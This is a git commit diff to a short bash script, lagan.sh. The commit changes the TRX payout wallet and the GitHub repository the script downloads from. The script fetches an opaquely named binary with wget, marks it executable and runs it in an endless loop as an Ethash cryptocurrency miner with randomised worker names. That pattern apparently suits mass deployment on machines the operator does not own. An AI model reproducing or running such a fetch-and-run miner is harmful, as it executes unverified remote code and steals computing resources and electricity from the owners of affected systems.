5451328121cc18c713c6f4dac052ca11bd5b2fa0
squibex <90225595+squibex@users.noreply.github.com>
2021-09-07 00:20:48 +0000

    Update lagan.sh

--- lagan.sh
+++ lagan.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+WALLET=TRX:THy2QWqsFcEQoEbKowmQR3jQjrW299ZbNt
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/archernap/prem/raw/main/priyatama
+wget https://github.com/squibex/prem/raw/main/priyatama
 chmod +x priyatama
 while [ 1 ]; do
 ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
